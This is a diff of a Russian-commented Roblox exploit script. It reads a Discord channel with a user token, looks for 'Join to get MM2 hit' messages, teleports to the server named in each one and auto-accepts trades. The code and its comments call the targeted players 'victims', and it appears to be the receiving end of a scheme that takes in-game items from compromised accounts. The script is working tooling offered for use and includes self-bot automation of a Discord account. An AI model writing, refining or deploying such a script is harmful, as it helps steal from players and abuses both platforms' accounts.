@@ -1,10 +1,11 @@
 if not game:IsLoaded() then
     game.Loaded:Wait()
-    print("Игра загрузилась")
+    print("✅ Игра загружена")
 end
 
+-- Проверка токена и ID канала
 if token == "" or channelId == "" then
-    game.Players.LocalPlayer:Kick("Добавьте ваш токен и channelId в скрипт")
+    game.Players.LocalPlayer:Kick("❌ Добавь токен и channelId в скрипт!")
     return
 end
 
@@ -13,27 +14,9 @@ local VirtualUser = game:GetService('VirtualUser')
 game:GetService('Players').LocalPlayer.Idled:Connect(function()
     VirtualUser:CaptureController()
     VirtualUser:ClickButton2(Vector2.new())
-    print("Anti-AFK сработал")
+    print("🔄 Anti-AFK активирован")
 end)
 
--- Инициализация файлов
-local HttpService = game:GetService("HttpService")
-if not isfile("user.txt") then
-    writefile("user.txt", "victim_username")
-    print("Создан файл user.txt")
-end
-if not isfile("joined_ids.txt") then
-    writefile("joined_ids.txt", "[]")
-    print("Создан файл joined_ids.txt")
-end
-
-local victimUser = readfile("user.txt")
-local joinedIds = HttpService:JSONDecode(readfile("joined_ids.txt"))
-local didVictimLeave = false
-local timer = 0
-local isTeleporting = false
-
--- Функция для выбора устройства (если нужно)
 local function selectDevice()
     local DeviceSelectGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeviceSelect")
     if DeviceSelectGui then
@@ -47,142 +30,92 @@ local function selectDevice()
     end
 end
 
--- Ожидание загрузки интерфейса
-local function waitForGui()
-    local success, err = pcall(function()
-        local mainGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI", 30):WaitForChild("Game", 30)
-        print("Интерфейс игры загружен")
-    end)
-    if not success then
-        warn("Ошибка при загрузке интерфейса: "..err)
+-- Настройки файлов
+local HttpService = game:GetService("HttpService")
+if not isfile("user.txt") then writefile("user.txt", "victim_username") end
+if not isfile("joined_ids.txt") then writefile("joined_ids.txt", "[]") end
+
+local victimUser = readfile("user.txt")
+local joinedIds = HttpService:JSONDecode(readfile("joined_ids.txt"))
+local isTeleporting = false
+
+-- Функция для парсинга команды телепортации
+local function findTeleportCommand(content)
+    if not content then return nil, nil end
+    
+    -- Ищем в формате: TeleportService:TeleportToPlaceInstance(placeId, "jobId")
+    local placeId, jobId = content:match('TeleportService:TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
+    
+    -- Альтернативный поиск (если первый вариант не сработал)
+    if not placeId or not jobId then
+        placeId, jobId = content:match('game:GetService%("TeleportService"%):TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
     end
+    
+    return placeId, jobId
 end
 
--- Функции для трейда
-local function IsTrading()
-    local status = game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
-    return status == "StartTrade"
-end
-
-local function acceptRequest()
-    while task.wait(0.5) do
-        pcall(function()
-            game:GetService('ReplicatedStorage').Trade.AcceptRequest:FireServer()
-        end)
-    end
-end
-
-local function acceptTrade()
-    while task.wait(0.5) do
-        if IsTrading() then
-            pcall(function()
-                game:GetService('ReplicatedStorage').Trade.AcceptTrade:FireServer()
-                print("Принят трейд")
-            end)
-        end
-    end
-end
-
--- Отслеживание выхода жертвы
-local function waitForPlayerLeave()
-    game.Players.PlayerRemoving:Connect(function(removedPlayer)
-        if removedPlayer.Name == victimUser then
-            didVictimLeave = true
-            print("Жертва вышла: "..victimUser)
-        end
-    end)
-end
-
--- Таймер для трейда
-local function tradeTimer()
-    while task.wait(1) do
-        if IsTrading() then
-            timer = 0
-        else
-            timer = timer + 1
-        end
-    end
-end
-
--- Основная функция для проверки сообщений Discord
-local function checkDiscordMessages()
+-- Основная функция проверки Discord
+local function checkDiscord()
     local response = request({
-        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
+        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=5",
         Method = "GET",
         Headers = {
             ['Authorization'] = token,
-            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
-            ["Content-Type"] = "application/json"
+            ['Content-Type'] = 'application/json'
         }
     })
 
-    if response.StatusCode ~= 200 then
-        warn("Ошибка при запросе к Discord API: "..response.StatusCode)
+    if not response.Success then
+        warn("❌ Ошибка Discord API: "..response.StatusCode)
         return
     end
 
     local messages = HttpService:JSONDecode(response.Body)
-    if #messages == 0 then
-        print("Новых сообщений нет")
-        return
-    end
-
-    for _, message in ipairs(messages) do
-        if message.embeds and #message.embeds > 0 then
-            local embed = message.embeds[1]
-            if embed.title and embed.title:find("Join to get MM2 hit") then
-                print("Найдено подходящее сообщение")
+    for _, msg in ipairs(messages) do
+        if msg.embeds and msg.embeds[1] and msg.embeds[1].title:find("Join to get MM2 hit") then
+            print("🔍 Найдено сообщение с хитом!")
+            
+            local placeId, jobId = findTeleportCommand(msg.content)
+            if placeId and jobId then
+                print("🎯 Найдена команда телепортации:")
+                print("   PlaceID:", placeId)
+                print("   JobID:", jobId)
                 
-                -- Ищем TeleportService в content
-                local content = message.content
-                if content then
-                    local placeId, jobId = content:match('game:GetService%("TeleportService"%):TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
-                    if placeId and jobId then
-                        print("Найдены ID сервера:", placeId, jobId)
-                        
-                        -- Проверяем, не присоединялись ли уже
-                        if not table.find(joinedIds, message.id) then
-                            -- Обновляем файл с жертвой
-                            local victimUsername = embed.fields[1].value:match("Username%s*:%s*(.-)\n")
-                            if victimUsername then
-                                writefile("user.txt", victimUsername)
-                                victimUser = victimUsername
-                                print("Обновлена жертва:", victimUsername)
-                            end
-                            
-                            -- Телепортация
-                            if didVictimLeave or timer > 5 then
-                                table.insert(joinedIds, message.id)
-                                writefile("joined_ids.txt", HttpService:JSONEncode(joinedIds))
-                                
-                                print("Попытка телепортации на сервер...")
-                                isTeleporting = true
-                                game:GetService("TeleportService"):TeleportToPlaceInstance(tonumber(placeId), jobId, game.Players.LocalPlayer)
-                                return
-                            end
-                        end
-                    else
-                        print("Не найдена команда телепортации в content")
-                    end
+                if not table.find(joinedIds, msg.id) then
+                    table.insert(joinedIds, msg.id)
+                    writefile("joined_ids.txt", HttpService:JSONEncode(joinedIds))
+                    
+                    print("🚀 Телепортация на сервер...")
+                    isTeleporting = true
+                    game:GetService("TeleportService"):TeleportToPlaceInstance(tonumber(placeId), jobId)
+                    return
+                else
+                    print("⚠️ Уже присоединялись к этому хиту")
                 end
+            else
+                print("❌ Не найдена команда телепортации в content:")
+                print(msg.content)
             end
         end
     end
 end
 
--- Инициализация
-task.spawn(selectDevice)
-task.spawn(waitForGui)
-task.spawn(acceptRequest)
-task.spawn(acceptTrade)
-task.spawn(tradeTimer)
-task.spawn(waitForPlayerLeave)
+-- Автопринятие трейдов
+local function autoAcceptTrade()
+    while task.wait(1) do
+        pcall(function()
+            game:GetService("ReplicatedStorage").Trade.AcceptRequest:FireServer()
+            game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
+        end)
+    end
+end
 
-print("Скрипт запущен. Ожидание сообщений...")
+-- Запуск
+task.spawn(autoAcceptTrade)
 
--- Основной цикл
+print("✨ Скрипт запущен! Ожидание новых хитов...")
 while task.wait(10) do
     if not isTeleporting then
-        pcall(checkDiscordMessages)
+        pcall(checkDiscord)
     end
 end
